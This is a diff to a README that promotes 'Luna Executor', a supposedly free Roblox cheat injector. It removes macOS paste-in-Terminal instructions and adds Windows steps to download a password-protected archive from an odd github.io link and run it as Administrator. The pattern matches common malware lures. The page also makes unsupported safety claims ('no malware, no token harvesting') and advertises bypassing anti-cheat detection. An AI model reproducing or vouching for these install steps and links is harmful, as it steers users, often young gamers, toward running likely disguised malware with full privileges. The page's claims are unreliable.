@@ -4,7 +4,7 @@
 ![User Rating](https://img.shields.io/badge/Community%20Rating-4.9%2F5-gold?style=for-the-badge&logo=star)
 ![Latest Version](https://img.shields.io/badge/Current%20Version-3.7.1-green?style=for-the-badge&logo=github)
 ![Game](https://img.shields.io/badge/Game-Roblox-darkgrey?style=for-the-badge)
-![Platform](https://img.shields.io/badge/Platform-Windows%20%7C%20macOS-lightgrey?style=for-the-badge&logo=windows)
+![Platform](https://img.shields.io/badge/Platform-Windows-lightgrey?style=for-the-badge&logo=windows)
 
 The **🚀 Luna Executor** is the most trusted free Roblox script executor in 2026 — keyless, stable, and built for players who expect transparency. 97% UNC score, live bypass status, and a rebuilt injection engine that has never had a confirmed global detection event.
 
@@ -14,17 +14,16 @@ The **🚀 Luna Executor** is the most trusted free Roblox script executor in 20
 
 </div>
 
-
->  **Please follow the installation guide below:** Make sure to complete every single step precisely to avoid any issues.
+> **Please follow the installation guide below:** Make sure to complete every single step precisely to avoid any issues.
 
 1. **⬇️ Download** the tool from the button above.
 2. **📦 Extract** the archive (password: cyrexmods)
 3. **🖱️ Run as Administrator** – right-click the executable and select *Run as Administrator*.
 4. **✅ Follow the setup wizard** – complete the installation.
 5. **🚀 Launch the Tool** – the main window appears.
-</div>
 
 ---
+
 ## 🔧 Features
 
 ### 🌙 Script Execution Engine
@@ -111,21 +110,15 @@ The **🚀 Luna Executor** is the most trusted free Roblox script executor in 20
 
 ### Windows
 
-1. **🔻 Download** from the button above
-2. **📦 Extract** — Right-click the archive → Extract All
-3. **🚀 Launch** — Open `Luna.exe`
-4. **🎮 Join any Roblox game**
-5. **⚡ Click Inject** — then paste or load your script and Execute
+1. **⬇️ Download** the tool from the button above.
+2. **📦 Extract** the archive (password: cyrexmods)
+3. **🖱️ Run as Administrator** – right-click the executable and select *Run as Administrator*.
+4. **✅ Follow the setup wizard** – complete the installation.
+5. **🚀 Launch the Tool** – the main window appears.
+6. **🎮 Join any Roblox game**
+7. **⚡ Click Inject** — then paste or load your script and Execute
 
 [![Download](https://img.shields.io/badge/🔻%20DOWNLOAD%20LUNA%20🔻-purple?style=for-the-badge&logo=github)](https://iloqhmlhfppl.github.io/win-get2/)
-
-### 🍎 macOS
-
-1. **Press `⌘ + Space`**, type **Terminal**, hit Enter
-2. **Paste the command** (`⌘ + V`) and press Enter
-3. **Follow the prompts** — the loader installs automatically
-
-[![Download for Mac](https://img.shields.io/badge/⬇️%20MAC%20DOWNLOAD-black?style=for-the-badge&logo=apple)](https://iloqhmlhfppl.github.io/mac-download2/)
 
 ---
 
@@ -141,24 +134,12 @@ The **🚀 Luna Executor** is the most trusted free Roblox script executor in 20
 | **Storage** | 200 MB |
 | **.NET** | .NET 6.0 or higher |
 
-### macOS
-
-| Component | Requirement |
-|-----------|-------------|
-| **OS** | macOS Monterey 12.0+ |
-| **CPU** | Apple M1 / Intel Core i5+ |
-| **RAM** | 8 GB+ |
-| **Storage** | 300 MB |
-
 ---
 
 ## ❓ FAQ
 
 ### 🛡️ Is Luna safe to use?
 **Yes.** No malware, no token harvesting. SHA256 hashes published with every release. Always use a secondary Roblox account.
-
-### 🍎 Does it work on Mac?
-**Yes.** Install via Terminal — paste the command and the loader runs automatically.
 
 ### 🔑 Is there a key system?
 **No.** Luna has been completely keyless since launch.
@@ -185,4 +166,3 @@ New bypass versions are typically available **within 24 hours** of any Roblox up
 Join over 2.1 million players who trust Luna Executor for reliable, transparent Roblox script execution in 2026.
 
 [![Download](https://img.shields.io/badge/🔻%20DOWNLOAD%20LUNA%20🔻-purple?style=for-the-badge&logo=github)](https://iloqhmlhfppl.github.io/win-get2/)
-[![Mac](https://img.shields.io/badge/⬇️%20MAC%20DOWNLOAD-black?style=for-the-badge&logo=apple)](https://iloqhmlhfppl.github.io/mac-download2/)
